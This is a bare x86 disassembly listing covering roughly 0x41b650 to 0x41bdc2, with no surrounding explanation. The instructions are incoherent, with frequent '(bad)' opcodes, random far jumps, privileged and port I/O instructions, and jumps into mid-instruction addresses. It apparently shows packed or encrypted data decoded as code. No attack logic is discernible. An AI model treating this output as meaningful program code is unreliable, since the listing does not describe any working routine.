  41b650:	jmp    0xb774:0xe190ca4c
  41b657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b658:	dec    esp
  41b659:	ss lock fdivr st,st(0)
  41b65d:	scas   eax,DWORD PTR es:[edi]
  41b65e:	sbb    ah,dh
  41b660:	gs retf 0x76f6
  41b664:	xor    dl,BYTE PTR ds:0x575fcbd6
  41b66a:	les    ebp,FWORD PTR [edx]
  41b66c:	push   ss
  41b66d:	or     eax,0xe18ef65
  41b672:	push   cs
  41b673:	test   eax,0x5fc1133f
  41b678:	rcr    dl,0xf7
  41b67b:	pop    es
  41b67c:	outs   dx,DWORD PTR ds:[si]
  41b67e:	fbstp  TBYTE PTR [edi]
  41b680:	xor    al,0x58
  41b682:	jecxz  0x41b6bf
  41b684:	mov    cl,al
  41b686:	jle    0x41b64a
  41b688:	sub    cl,BYTE PTR [eax]
  41b68a:	cmp    eax,0x9b7fdf04
  41b68f:	pop    es
  41b690:	mov    bh,0xf7
  41b692:	xchg   DWORD PTR [edx],esp
  41b694:	addr16 xor al,0x92
  41b697:	sub    al,0xa4
  41b699:	sbb    ebp,eax
  41b69b:	sahf   
  41b69c:	in     eax,0xd7
  41b69e:	retf   0x53c1
  41b6a1:	aaa    
  41b6a2:	or     bl,BYTE PTR [edi-0x47]
  41b6a5:	(bad)  
  41b6a6:	invd   
  41b6a8:	cmp    esi,DWORD PTR [edi]
  41b6aa:	in     al,0xe4
  41b6ac:	out    dx,eax
  41b6ad:	add    DWORD PTR [ebx],edi
  41b6af:	popa   
  41b6b0:	jl     0x41b70f
  41b6b2:	out    dx,al
  41b6b3:	mov    ch,0x4a
  41b6b5:	fidiv  WORD PTR [esi-0x4517f34c]
  41b6bb:	mov    ebx,0x4bd22c80
  41b6c0:	retf   0xb25c
  41b6c3:	shl    BYTE PTR [edi],1
  41b6c5:	dec    eax
  41b6c6:	loopne 0x41b71f
  41b6c8:	(bad)  
  41b6c9:	jmp    0x3896:0x5fcd29cb
  41b6d0:	dec    edi
  41b6d1:	test   DWORD PTR [ebp-0xb],esp
  41b6d4:	mov    ah,0x1a
  41b6d6:	std    
  41b6d7:	sti    
  41b6d8:	add    edi,DWORD PTR [esi+0xe530eb0]
  41b6de:	fidiv  DWORD PTR [esi+0x7e]
  41b6e1:	cmp    eax,0x69862385
  41b6e6:	scas   eax,DWORD PTR es:[edi]
  41b6e7:	stc    
  41b6e8:	push   edx
  41b6e9:	mov    ah,0xf6
  41b6eb:	cdq    
  41b6ec:	jp     0x41b6ab
  41b6ee:	and    eax,0xe1673e6d
  41b6f3:	ror    BYTE PTR [esi],1
  41b6f5:	fild   WORD PTR fs:[ebx+0x5b]
  41b6f9:	rol    BYTE PTR ds:0x8499c270,1
  41b6ff:	push   edx
  41b700:	idiv   DWORD PTR [edi+0x2e7c7701]
  41b706:	mov    ebp,0x405cca26
  41b70b:	popa   
  41b70c:	je     0x41b6c8
  41b70e:	lahf   
  41b70f:	sbb    eax,0x42a0b638
  41b714:	or     al,0xf9
  41b716:	icebp  
  41b717:	or     eax,0xf051bad7
  41b71c:	pushf  
  41b71d:	pop    ss
  41b71e:	lahf   
  41b71f:	loope  0x41b6db
  41b721:	clc    
  41b722:	mov    al,ds:0x4ab9f5c3
  41b727:	fidiv  WORD PTR [edi+0x7ed216e6]
  41b72d:	xchg   ebp,eax
  41b72e:	rcr    DWORD PTR [edx+ebp*2+0x6a],cl
  41b732:	and    bl,BYTE PTR [esi]
  41b734:	inc    ebx
  41b735:	test   BYTE PTR [eax+0x3c],dh
  41b738:	loope  0x41b6e0
  41b73a:	push   ds
  41b73b:	cli    
  41b73c:	(bad)  
  41b73d:	cld    
  41b73e:	add    DWORD PTR [eax+esi*1],ebx
  41b741:	cwde   
  41b742:	sahf   
  41b743:	adc    BYTE PTR [esp+edx*2+0x588085b8],cl
  41b74a:	dec    ecx
  41b74b:	in     eax,0x77
  41b74d:	pop    edx
  41b74e:	push   esi
  41b74f:	(bad)  
  41b750:	and    DWORD PTR [edx+0x3a],esp
  41b753:	jge    0x41b7b5
  41b755:	gs test al,0x54
  41b758:	mov    ebp,0x1b2a97da
  41b75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b75e:	jae    0x41b76c
  41b760:	(bad)  
  41b761:	jbe    0x41b79f
  41b763:	(bad)  
  41b764:	retf   
  41b765:	sbb    esp,DWORD PTR [edx+0x2a3e1ebf]
  41b76b:	jbe    0x41b766
  41b76d:	xchg   edi,eax
  41b76e:	sbb    BYTE PTR [edx+0x2fb13365],bl
  41b774:	sbb    al,0xbe
  41b776:	and    ch,dh
  41b778:	bound  ecx,QWORD PTR [edx-0x5c]
  41b77b:	push   esp
  41b77c:	test   eax,0xd9546e22
  41b781:	mov    ch,0x3b
  41b783:	dec    esi
  41b784:	cmp    al,0x3d
  41b786:	out    dx,eax
  41b787:	mov    eax,ds:0xa9714c5d
  41b78c:	idiv   ecx
  41b78e:	xor    eax,0x4c857461
  41b793:	cmp    BYTE PTR [edi-0x3],bl
  41b796:	xor    al,0xd
  41b798:	(bad)  
  41b799:	das    
  41b79a:	jno    0x41b7f0
  41b79c:	inc    esi
  41b79d:	(bad)  
  41b79e:	mov    esp,0xb64945dd
  41b7a3:	jmp    0x96094582
  41b7a8:	loope  0x41b807
  41b7aa:	test   al,0xe5
  41b7ac:	pop    edx
  41b7ad:	std    
  41b7ae:	mul    BYTE PTR [eax+ebx*4+0x46f46a9d]
  41b7b5:	jecxz  0x41b79d
  41b7b7:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b7b9:	or     ah,ch
  41b7bb:	outs   dx,BYTE PTR ds:[esi]
  41b7bc:	fidiv  DWORD PTR [edx]
  41b7be:	fidiv  DWORD PTR [eax+0x2f]
  41b7c1:	inc    eax
  41b7c2:	inc    ecx
  41b7c3:	outs   dx,BYTE PTR ds:[esi]
  41b7c4:	add    dl,BYTE PTR [edx-0x6776f13c]
  41b7ca:	test   BYTE PTR [esi+0x69],cl
  41b7cd:	clc    
  41b7ce:	xchg   ecx,eax
  41b7cf:	or     BYTE PTR [esi],dl
  41b7d1:	dec    esp
  41b7d2:	jnp    0x41b7d0
  41b7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7d6:	dec    esi
  41b7d7:	add    DWORD PTR [esp+eiz*4],esp
  41b7da:	shl    BYTE PTR [esi+0x2b],0x0
  41b7de:	dec    ebp
  41b7df:	jge    0x41b833
  41b7e1:	sub    BYTE PTR ds:0xdbbbc769,dh
  41b7e7:	jno    0x41b7a8
  41b7e9:	(bad)  
  41b7ea:	dec    ebx
  41b7eb:	mov    cl,0x75
  41b7ed:	or     BYTE PTR [edi],ch
  41b7ef:	push   esp
  41b7f0:	repz inc edi
  41b7f2:	xchg   ebp,eax
  41b7f3:	in     eax,dx
  41b7f4:	mov    bl,0xd2
  41b7f6:	push   ecx
  41b7f7:	inc    ebp
  41b7f8:	js     0x41b879
  41b7fa:	cmp    bh,bh
  41b7fc:	ror    esp,cl
  41b7fe:	in     eax,0x47
  41b800:	mov    esi,0xa192403b
  41b805:	pop    ebp
  41b806:	jae    0x41b82a
  41b808:	xor    BYTE PTR [ebx+ebx*8-0x5b],dh
  41b80c:	(bad)  
  41b80d:	(bad)  
  41b80e:	fnstsw WORD PTR [edi+edx*2+0x2217d8ce]
  41b815:	test   eax,0xf04dd465
  41b81a:	(bad)  
  41b81b:	pushf  
  41b81c:	push   es
  41b81d:	pop    ebx
  41b81e:	das    
  41b81f:	mov    dl,0x21
  41b821:	mov    cs,ebx
  41b823:	pop    ds
  41b824:	pop    ss
  41b825:	mov    edx,0x9f61088f
  41b82a:	outs   dx,DWORD PTR ds:[esi]
  41b82b:	dec    ebp
  41b82c:	cld    
  41b82d:	jno    0x41b889
  41b82f:	and    BYTE PTR [edi+0x2907b1b],ah
  41b835:	test   eax,0xe00b1cb6
  41b83a:	jp     0x41b884
  41b83c:	fwait
  41b83d:	ins    BYTE PTR es:[edi],dx
  41b83e:	mov    bl,0x73
  41b840:	out    dx,al
  41b841:	adc    DWORD PTR [esi],0x47
  41b844:	imul   eax,DWORD PTR [ebx+ebx*8],0xc692d40b
  41b84b:	push   ss
  41b84c:	fcomp  QWORD PTR ds:0xc2b4928c
  41b852:	push   ss
  41b853:	iret   
  41b854:	mov    fs,WORD PTR [edx+0x2f]
  41b857:	les    edx,FWORD PTR [edx-0x48e6b4f8]
  41b85d:	xor    eax,0x4b2dc943
  41b862:	add    al,0x5c
  41b864:	sbb    esp,DWORD PTR [esi+edi*1]
  41b867:	clc    
  41b868:	sbb    bl,ch
  41b86a:	daa    
  41b86b:	test   DWORD PTR [edx+edx*1],0xd9aa517a
  41b872:	and    BYTE PTR ds:0x5ad13018,bh
  41b878:	add    eax,DWORD PTR [ebx-0x27]
  41b87b:	xchg   esp,eax
  41b87c:	jg     0x41b8ec
  41b87e:	push   eax
  41b87f:	xchg   esp,eax
  41b880:	cli    
  41b881:	add    ebp,DWORD PTR [edx-0x656ab3ed]
  41b887:	sbb    ebp,DWORD PTR [edx]
  41b889:	les    ebp,FWORD PTR [esi-0x2b3e52da]
  41b88f:	xor    ebp,ecx
  41b891:	fdivp  st(2),st
  41b893:	and    eax,0xc8e3d9db
  41b898:	mov    eax,0xeef6d4f6
  41b89d:	jge    0x41b90b
  41b89f:	imul   DWORD PTR [edx+0x1ae61096]
  41b8a5:	mov    esi,0xac7384d0
  41b8aa:	xor    eax,0xf2c6c16a
  41b8af:	sar    BYTE PTR [ecx+0x66be95fa],1
  41b8b5:	retf   0xcb87
  41b8b8:	cld    
  41b8b9:	xor    al,BYTE PTR [ecx-0x6b]
  41b8bc:	rcl    DWORD PTR [ebx+0x7ebd8365],cl
  41b8c2:	add    al,0xc7
  41b8c4:	imul   esi,DWORD PTR [esi+0x33fd6958],0x1c
  41b8cb:	fisub  WORD PTR [edx+ecx*2-0x73da2d35]
  41b8d2:	pop    ds
  41b8d3:	mov    bl,0xd1
  41b8d5:	sub    DWORD PTR [edi*1+0xf5e6bd9],esi
  41b8dc:	out    0x9e,eax
  41b8de:	rcr    BYTE PTR [ebx+0x5e3a374],0xe2
  41b8e5:	fs aad 0xf5
  41b8e8:	jg     0x41b966
  41b8ea:	or     eax,0x8ddf772c
  41b8ef:	nop
  41b8f0:	mov    al,ds:0x25be33b3
  41b8f6:	aam    0xe6
  41b8f8:	and    eax,0xaa94661e
  41b8fd:	lea    esp,ds:0xf3e3ea96
  41b903:	mov    edi,DWORD PTR [edx-0x20]
  41b906:	or     esi,ecx
  41b908:	lods   eax,DWORD PTR ds:[esi]
  41b909:	push   esp
  41b90a:	pop    ebp
  41b90b:	popa   
  41b90c:	psadbw mm2,QWORD PTR [esi+0x7de0326f]
  41b913:	push   ebp
  41b914:	in     al,0xb3
  41b916:	lahf   
  41b917:	popf   
  41b918:	pop    ss
  41b919:	mov    ebp,0x73b42615
  41b91e:	ret    
  41b91f:	ja     0x41b8e2
  41b921:	pop    esp
  41b922:	sar    DWORD PTR [edi],0x6f
  41b925:	sub    BYTE PTR [esi-0x6d],dl
  41b928:	leave  
  41b929:	rol    ah,1
  41b92b:	into   
  41b92c:	mov    al,0xa2
  41b92e:	jmp    0x7c6a:0x1a63c59b
  41b935:	sar    BYTE PTR [edi-0x3aa0b2d2],0x11
  41b93c:	mov    eax,ds:0xe6a2892a
  41b941:	sub    eax,edi
  41b943:	(bad)  
  41b944:	and    BYTE PTR [edi+eiz*4+0x4e],cl
  41b948:	test   al,0x81
  41b94a:	pop    edi
  41b94b:	pushf  
  41b94c:	dec    esp
  41b94d:	bound  ecx,QWORD PTR [ebx+0x746a18ac]
  41b953:	imul   edx,DWORD PTR [esi+0x6c89d37e],0x16
  41b95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b95b:	inc    edx
  41b95c:	(bad)  
  41b95d:	jmp    FWORD PTR [edi+eax*8+0x2683d924]
  41b964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b965:	sbb    al,0xc1
  41b967:	retf   
  41b968:	fcmove st,st(4)
  41b96a:	mov    ebx,DWORD PTR [esi-0x19]
  41b96d:	leave  
  41b96e:	popa   
  41b96f:	popa   
  41b970:	inc    esi
  41b971:	sbb    BYTE PTR [esi-0x343d0a8d],dh
  41b977:	push   edx
  41b978:	jbe    0x41b9f4
  41b97a:	data16 jnp 0x41b931
  41b97d:	pop    ebx
  41b97e:	mov    al,ds:0xcbd34264
  41b983:	add    al,0x89
  41b985:	aam    0x80
  41b987:	mov    WORD PTR [edx],fs
  41b989:	mov    esp,0x1122368a
  41b98e:	retf   0xeb5f
  41b991:	mov    ch,0x4b
  41b993:	xlat   BYTE PTR ds:[ebx]
  41b994:	and    BYTE PTR [edi-0x7795f524],bl
  41b99a:	lods   eax,DWORD PTR ds:[esi]
  41b99b:	jl     0x41b92b
  41b99d:	nop
  41b99e:	fstp   TBYTE PTR [eax]
  41b9a0:	xlat   BYTE PTR ds:[ebx]
  41b9a1:	and    ah,ch
  41b9a3:	ret    0x6a52
  41b9a6:	loope  0x41b93b
  41b9a8:	xor    ecx,edx
  41b9aa:	jb     0x41b9ad
  41b9ac:	rol    al,0xef
  41b9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9b0:	push   eax
  41b9b1:	jnp    0x41ba0c
  41b9b3:	popf   
  41b9b4:	sbb    eax,0x61c50435
  41b9b9:	push   0x156b3eae
  41b9be:	pop    ds
  41b9bf:	pushf  
  41b9c0:	popf   
  41b9c1:	push   esi
  41b9c2:	lea    edi,[ebp+0x7ff37e88]
  41b9c8:	and    ebx,DWORD PTR [esi+0x7b]
  41b9cb:	jmp    edi
  41b9cd:	mov    ds:0xec4ef470,al
  41b9d2:	aam    0xb0
  41b9d4:	cmp    al,0xb0
  41b9d6:	cmp    ah,BYTE PTR [ecx-0x3f06ba06]
  41b9dc:	jnp    0x41ba41
  41b9de:	add    eax,0x46bf9dcb
  41b9e3:	and    BYTE PTR [ecx-0x7316e53f],ah
  41b9e9:	(bad)  
  41b9ea:	mov    edi,0x9bcb27eb
  41b9ef:	mov    ds:0x348b0fd3,al
  41b9f4:	popf   
  41b9f5:	jmp    0x5defab92
  41b9fa:	imul   ecx
  41b9fc:	mov    ebp,DWORD PTR [ecx+0x452d41cf]
  41ba02:	xor    eax,0x48abc6ff
  41ba07:	mov    dl,0x40
  41ba09:	fsubr  QWORD PTR [ebp+0x457db105]
  41ba0f:	inc    esi
  41ba10:	push   ds
  41ba11:	xor    eax,0x5685e958
  41ba16:	mov    esp,0xb34182c8
  41ba1b:	imul   ecx,DWORD PTR [edi+eax*2+0x15],0xd0ef271c
  41ba23:	retf   
  41ba24:	xchg   ecx,eax
  41ba25:	mov    edx,0xb4e27a8d
  41ba2a:	aaa    
  41ba2b:	and    dl,BYTE PTR [ebx-0x4b67c983]
  41ba31:	iret   
  41ba32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba33:	ins    DWORD PTR es:[edi],dx
  41ba34:	add    al,BYTE PTR [ecx-0x2fc12375]
  41ba3a:	gs dec edx
  41ba3c:	pop    ebx
  41ba3d:	jb     0x41baaf
  41ba3f:	imul   edx,DWORD PTR [ecx+ebx*1-0x5e51a6d7],0x952a099b
  41ba4a:	xchg   ebp,eax
  41ba4b:	scas   eax,DWORD PTR es:[edi]
  41ba4c:	loope  0x41ba00
  41ba4e:	xchg   esi,eax
  41ba4f:	jbe    0x41ba12
  41ba51:	cwde   
  41ba52:	stos   BYTE PTR es:[edi],al
  41ba53:	xor    DWORD PTR [edx],ebx
  41ba55:	test   DWORD PTR [ecx],ebx
  41ba57:	lock aam 0x53
  41ba5a:	(bad)  
  41ba5c:	jmp    0x41ba10
  41ba5e:	ret    
  41ba5f:	sub    eax,0xe9de7eda
  41ba64:	mov    ebp,0x3f73c45b
  41ba69:	outs   dx,BYTE PTR ds:[esi]
  41ba6a:	rcr    BYTE PTR [edx-0x18b22864],cl
  41ba70:	cmc    
  41ba71:	cmp    DWORD PTR [ebp-0x22],esp
  41ba74:	outs   dx,BYTE PTR ds:[esi]
  41ba75:	inc    edi
  41ba76:	inc    edx
  41ba77:	mov    al,0x86
  41ba79:	jmp    0xdf02901a
  41ba7e:	jl     0x41ba62
  41ba80:	jns    0x41ba53
  41ba82:	dec    ebp
  41ba83:	pop    es
  41ba84:	outs   dx,BYTE PTR ds:[esi]
  41ba85:	imul   edi,DWORD PTR [ebp+0x4],0xffffffed
  41ba89:	lahf   
  41ba8a:	hlt    
  41ba8b:	sbb    BYTE PTR [esi],bl
  41ba8d:	dec    ebx
  41ba8e:	mov    al,ds:0xb50aee3b
  41ba93:	sub    DWORD PTR [esi+0x630d2316],ebx
  41ba99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba9a:	sbb    esi,DWORD PTR [ecx-0x739fde9]
  41baa0:	adc    ebx,esi
  41baa2:	out    dx,eax
  41baa3:	fistp  DWORD PTR [edi+0x52]
  41baa6:	jecxz  0x41bad2
  41baa8:	mov    cl,0x13
  41baaa:	in     eax,dx
  41baab:	mov    ah,0x77
  41baad:	xchg   ebx,eax
  41baae:	in     eax,0xf0
  41bab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bab1:	(bad)  
  41bab2:	and    DWORD PTR [edi-0x3bbc492c],esi
  41bab8:	jge    0x41ba7f
  41baba:	pop    edi
  41babb:	lahf   
  41babc:	jmp    0x41bb3b
  41babe:	imul   esp,DWORD PTR [edi+edi*1-0x6521a389],0x76
  41bac6:	sub    BYTE PTR [esi+eax*8],cl
  41bac9:	dec    edx
  41baca:	leave  
  41bacb:	push   edx
  41bacc:	adc    DWORD PTR [edi-0x2bf9293b],esi
  41bad2:	(bad)  
  41bad3:	jl     0x41bb36
  41bad5:	sub    ecx,0x16
  41bad8:	jo     0x41bb1e
  41bada:	jb     0x41baa4
  41badc:	aaa    
  41badd:	les    ebp,FWORD PTR ds:0x82735344
  41bae3:	jae    0x41ba9d
  41bae5:	mov    ah,0x9d
  41bae7:	stc    
  41bae8:	div    DWORD PTR [edx]
  41baea:	cli    
  41baeb:	out    0x6a,eax
  41baed:	and    al,0x5c
  41baef:	outs   dx,DWORD PTR ds:[esi]
  41baf0:	fadd   QWORD PTR [eax+0x6f]
  41baf3:	sti    
  41baf4:	fcmovbe st,st(7)
  41baf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baf7:	sub    al,cl
  41baf9:	test   eax,0x10518333
  41bafe:	and    esi,DWORD PTR [edx+0x324cf735]
  41bb04:	loopne 0x41bb6b
  41bb06:	xchg   esp,eax
  41bb07:	popf   
  41bb08:	mov    ds:0xec0319bb,al
  41bb0d:	ds mov al,0xbd
  41bb10:	or     ebx,DWORD PTR [edx]
  41bb12:	and    edx,ebx
  41bb14:	ds push eax
  41bb16:	sub    edx,DWORD PTR [esi]
  41bb18:	jge    0x41bafc
  41bb1a:	and    edx,DWORD PTR [esi+edi*2-0x51c6a5ca]
  41bb21:	imul   esp,DWORD PTR [esi],0xffffff95
  41bb24:	lods   al,BYTE PTR ds:[esi]
  41bb25:	arpl   bx,dx
  41bb27:	test   DWORD PTR [ecx-0x9],edx
  41bb2a:	cmc    
  41bb2b:	mov    esi,0x18ae4d51
  41bb30:	xchg   ecx,eax
  41bb31:	or     al,0xb4
  41bb33:	push   0x891ae611
  41bb38:	test   DWORD PTR [ecx+0x49],esi
  41bb3b:	push   ebx
  41bb3c:	(bad)  
  41bb3d:	call   0x1ec5:0xe57ec322
  41bb44:	test   DWORD PTR [edi],0x20bc2062
  41bb4a:	pop    esi
  41bb4b:	or     bh,BYTE PTR [ecx-0x33]
  41bb4e:	(bad)  
  41bb4f:	scas   eax,DWORD PTR es:[edi]
  41bb50:	sbb    eax,0x889e7438
  41bb55:	addr16 mov al,ds:0xa6df
  41bb59:	ret    
  41bb5a:	mov    al,0x8d
  41bb5c:	in     eax,dx
  41bb5d:	jg     0x41badf
  41bb5f:	cwde   
  41bb60:	mov    ecx,0x6dbb5d4f
  41bb65:	mov    eax,0xda252b61
  41bb6a:	scas   al,BYTE PTR es:[edi]
  41bb6b:	lods   eax,DWORD PTR ds:[esi]
  41bb6c:	xor    DWORD PTR [edi+0x31],edi
  41bb6f:	jmp    0x7c02:0xa7a46c58
  41bb76:	mov    edx,0x22fb649d
  41bb7b:	jmp    0x4d58:0x372c172b
  41bb82:	adc    esi,DWORD PTR [ebx-0xd8807ed]
  41bb88:	xchg   edx,eax
  41bb89:	push   edx
  41bb8a:	sub    esp,esi
  41bb8c:	hlt    
  41bb8d:	mov    ds:0xc12baafc,al
  41bb92:	mov    bh,0x44
  41bb94:	cmp    bl,BYTE PTR [esi+0x59a272e]
  41bb9a:	jecxz  0x41bbb1
  41bb9c:	cdq    
  41bb9d:	outs   dx,DWORD PTR ds:[esi]
  41bb9e:	sti    
  41bb9f:	push   cs
  41bba0:	aaa    
  41bba1:	mov    eax,0xfbb752f0
  41bba6:	inc    edx
  41bba7:	xchg   ebx,eax
  41bba8:	xchg   ebx,eax
  41bba9:	outs   dx,DWORD PTR ds:[esi]
  41bbaa:	jmp    0xb2a91ad
  41bbaf:	jbe    0x41bb81
  41bbb1:	les    edi,FWORD PTR [eax-0x72]
  41bbb4:	xchg   DWORD PTR [ebx-0x44573bf9],esi
  41bbba:	xchg   cx,ax
  41bbbc:	adc    BYTE PTR [ecx],al
  41bbbe:	ds ins DWORD PTR es:[edi],dx
  41bbc0:	mov    bh,0x2d
  41bbc2:	jne    0x41bb49
  41bbc4:	imul   DWORD PTR [edx+0x2e]
  41bbc7:	add    al,0x76
  41bbc9:	or     bh,BYTE PTR ds:[esi]
  41bbcc:	test   DWORD PTR [ecx+0x55],edi
  41bbcf:	aaa    
  41bbd0:	pop    edx
  41bbd1:	pop    ecx
  41bbd2:	gs mov cl,0xc
  41bbd5:	jmp    0x41bbe9
  41bbd7:	ss push esp
  41bbd9:	sub    eax,0x80f3ca78
  41bbde:	out    dx,al
  41bbdf:	inc    edx
  41bbe0:	std    
  41bbe1:	pop    edi
  41bbe2:	mov    edi,fs
  41bbe4:	pop    edx
  41bbe5:	cmp    DWORD PTR [edi],esi
  41bbe7:	clc    
  41bbe8:	call   0x30c5:0x7a436915
  41bbef:	or     ah,ah
  41bbf1:	mov    eax,es
  41bbf3:	sbb    BYTE PTR [ecx+0x75],al
  41bbf6:	outs   dx,DWORD PTR ds:[esi]
  41bbf7:	out    dx,al
  41bbf8:	fisubr WORD PTR [esi+eiz*2-0xb]
  41bbfc:	(bad)  
  41bbfd:	icebp  
  41bbfe:	xor    eax,0x79304cc9
  41bc03:	cwde   
  41bc04:	mov    ds:0x6cf871c8,al
  41bc09:	jne    0x41bbb7
  41bc0b:	addr16 inc edi
  41bc0d:	mov    ah,0x68
  41bc0f:	lock and DWORD PTR [ebx],ebx
  41bc12:	stos   BYTE PTR es:[edi],al
  41bc13:	jl     0x41bbd4
  41bc15:	pop    ss
  41bc16:	mov    ebp,DWORD PTR [ebp+0xd]
  41bc19:	or     al,BYTE PTR [eax]
  41bc1b:	and    eax,ebp
  41bc1d:	cld    
  41bc1e:	adc    DWORD PTR [eax],ebx
  41bc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc21:	inc    ecx
  41bc22:	test   DWORD PTR [esp+edi*8-0x48],0x4407019e
  41bc2a:	xor    ebp,edi
  41bc2c:	shr    BYTE PTR [eax-0x7e],1
  41bc2f:	imul   BYTE PTR [edx-0xd]
  41bc32:	push   esi
  41bc33:	jno    0x41bbf4
  41bc35:	sub    cl,BYTE PTR [esi+0x31effe8]
  41bc3b:	mov    bh,0x7d
  41bc3d:	jbe    0x41bc79
  41bc3f:	xor    eax,0x2cb82280
  41bc44:	jnp    0x41bc41
  41bc46:	mov    ds:0x9ff9e2c4,al
  41bc4b:	add    dh,BYTE PTR [edi-0x764d720b]
  41bc51:	inc    edi
  41bc52:	mov    es,WORD PTR [edi-0x48bf958c]
  41bc58:	aad    0x87
  41bc5a:	neg    BYTE PTR [edi]
  41bc5c:	xchg   ebp,eax
  41bc5d:	xor    ch,BYTE PTR [esi+0x2c8adec4]
  41bc63:	mov    eax,0xb0f2cbb9
  41bc68:	call   0x3604:0xda3e3eb1
  41bc6f:	adc    al,0x90
  41bc71:	jg     0x41bccb
  41bc73:	lods   eax,DWORD PTR ds:[esi]
  41bc74:	mov    al,0xc
  41bc76:	enter  0x942c,0x55
  41bc7a:	pop    ebx
  41bc7b:	or     al,0xf9
  41bc7d:	in     eax,dx
  41bc7e:	jmp    0xa2eb:0x21227bf4
  41bc85:	loop   0x41bcf9
  41bc87:	(bad)  
  41bc88:	mov    bl,BYTE PTR [ecx]
  41bc8a:	repnz add cl,BYTE PTR [ebx-0x1e]
  41bc8e:	add    DWORD PTR [ebx],esi
  41bc90:	es or  ecx,esi
  41bc93:	pop    eax
  41bc94:	or     al,0xd8
  41bc96:	mov    ebx,0x83de1c3b
  41bc9b:	sub    eax,0xb5480cc5
  41bca0:	mov    cl,0x42
  41bca2:	fs fdiv st,st(3)
  41bca5:	cmp    dl,BYTE PTR [esi-0x61c8105d]
  41bcab:	jbe    0x41bc77
  41bcad:	lahf   
  41bcae:	in     al,dx
  41bcaf:	mov    edx,0x244d0084
  41bcb4:	jno    0x41bc57
  41bcb6:	push   ebx
  41bcb7:	aas    
  41bcb8:	enter  0x4c37,0xd2
  41bcbc:	pop    eax
  41bcbd:	jg     0x41bc54
  41bcbf:	dec    ebx
  41bcc0:	mov    eax,0xb1dcefb7
  41bcc5:	and    DWORD PTR [ecx],esi
  41bcc7:	in     al,dx
  41bcc8:	jp     0x41bc7c
  41bcca:	cmp    eax,0x9d4880d9
  41bccf:	mov    al,ds:0xdaf4e3a4
  41bcd4:	sti    
  41bcd5:	or     DWORD PTR [ebx-0x28802bef],0x7c4ae08e
  41bcdf:	mov    dl,0x10
  41bce1:	jle    0x41bd44
  41bce3:	jns    0x41bced
  41bce5:	jns    0x41bcf7
  41bce7:	repnz mov edi,0xa91a29ca
  41bced:	pop    eax
  41bcee:	les    esp,FWORD PTR [eax]
  41bcf0:	test   eax,0x6d96fea1
  41bcf5:	sbb    eax,0xf4057253
  41bcfa:	jmp    0x8ee2:0x5fe3b751
  41bd01:	pop    esi
  41bd02:	int    0xe6
  41bd04:	das    
  41bd05:	mov    ecx,0x48a526de
  41bd0a:	je     0x41bd57
  41bd0c:	dec    eax
  41bd0d:	mov    edx,0x34d30172
  41bd12:	mov    esp,0x3e8af4de
  41bd17:	je     0x41bd47
  41bd19:	inc    ecx
  41bd1a:	test   BYTE PTR [ebx],dl
  41bd1c:	or     ecx,DWORD PTR [esi+0x2f8814d1]
  41bd22:	loop   0x41bd66
  41bd24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd25:	int3   
  41bd26:	mov    edx,0xf328c764
  41bd2b:	and    BYTE PTR [ebx+0x10c3ec2b],cl
  41bd31:	push   0xffffffa6
  41bd33:	cmp    DWORD PTR [ecx],esp
  41bd35:	shl    ebx,0xe7
  41bd38:	mov    al,0xa2
  41bd3a:	sub    edx,DWORD PTR [esi]
  41bd3c:	cmc    
  41bd3d:	or     eax,0xad89d63
  41bd42:	sbb    BYTE PTR [edx-0x15],al
  41bd45:	add    eax,0x564a0f2a
  41bd4a:	in     al,dx
  41bd4b:	adc    ebx,DWORD PTR [esi+0x79]
  41bd4e:	xor    eax,0x43ccc1f9
  41bd53:	daa    
  41bd54:	das    
  41bd55:	sbb    cl,bl
  41bd57:	inc    eax
  41bd58:	pusha  
  41bd59:	lods   eax,DWORD PTR ds:[esi]
  41bd5a:	push   ebx
  41bd5b:	cmp    BYTE PTR [ecx],al
  41bd5d:	push   esp
  41bd5e:	mov    fs,WORD PTR [ebp+0x4b]
  41bd61:	mov    ds:0x4b670195,al
  41bd66:	lds    eax,FWORD PTR [ebx]
  41bd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd69:	loope  0x41bd0d
  41bd6b:	xor    ebx,DWORD PTR ds:0x4e0d71bf
  41bd71:	jge    0x41bd28
  41bd73:	test   eax,0xa5641709
  41bd78:	ret    0x1ffd
  41bd7b:	mov    edx,DWORD PTR ds:0x6ba508c
  41bd81:	xchg   edi,eax
  41bd82:	adc    bh,BYTE PTR [eax]
  41bd84:	pop    ss
  41bd85:	pop    esi
  41bd86:	dec    ebp
  41bd87:	xor    edi,edi
  41bd89:	jecxz  0x41bda6
  41bd8b:	in     eax,0xd6
  41bd8d:	pop    ecx
  41bd8e:	loopne 0x41bdab
  41bd90:	int3   
  41bd91:	pop    esp
  41bd92:	shr    BYTE PTR [eax-0x6],1
  41bd95:	xor    al,bl
  41bd97:	and    ah,dl
  41bd99:	adc    esp,DWORD PTR [ebx]
  41bd9b:	pop    ds
  41bd9c:	test   BYTE PTR [edi+0x32],al
  41bd9f:	ins    BYTE PTR es:[edi],dx
  41bda0:	(bad)  ds:0xfa2512a0
  41bda6:	jg     0x41be10
  41bda8:	push   edx
  41bda9:	and    bh,0xb7
  41bdac:	jmp    0x41bd70
  41bdae:	add    eax,DWORD PTR [eax-0x49]
  41bdb1:	push   esi
  41bdb2:	add    DWORD PTR [eax-0x9],esi
  41bdb5:	cmp    DWORD PTR [ecx+eax*2+0x74],esi
  41bdb9:	push   es
  41bdba:	dec    ebx
  41bdbb:	dec    ebp
  41bdbc:	fst    st(1)
  41bdbe:	sbb    al,0x7b
  41bdc0:	stc    
  41bdc1:	lods   al,BYTE PTR ds:[esi]
  41bdc2:	jmp    0x41be35
